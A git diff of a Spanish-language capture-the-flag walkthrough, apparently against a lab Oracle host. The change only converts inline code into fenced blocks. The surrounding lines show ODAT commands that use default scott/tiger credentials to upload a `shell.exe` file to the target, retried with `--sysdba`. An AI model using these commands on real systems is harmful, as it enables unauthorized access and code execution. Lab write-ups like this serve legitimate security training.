@@ -113,7 +113,15 @@ wget https://download.oracle.com/otn_software/linux/instantclient/211000/oracle-
 wget https://download.oracle.com/otn_software/linux/instantclient/211000/oracle-instantclient-devel-21.1.0.0.0-1.x86_64.rpm
 ```
 
-ahora transformamos los `.rpm` en `.deb` y lo installamos
+ahora transformamos los 
+```bash
+ .rpm 
+```
+ en 
+```bash
+ .deb 
+```
+ y lo installamos
 
 ```bash
 alien --to-deb *.rpm
@@ -167,7 +175,11 @@ python3 odat.py --help
     python3 odat.py utlfile -s 10.10.10.82 -d XE -U "scott" -P "tiger" --putFile /Temp shell.exe
     ```
 
-1. No tenemos sufficientes privilegios para subir archivos pero ODAT tiene un parametro `--sysdba` que nos puede ayudar
+1. No tenemos sufficientes privilegios para subir archivos pero ODAT tiene un parametro 
+```bash
+ --sysdba 
+```
+ que nos puede ayudar
 
     ```bash
     python3 odat.py utlfile -s 10.10.10.82 -d XE -U "scott" -P "tiger" --putFile /Temp shell.exe --sysdba
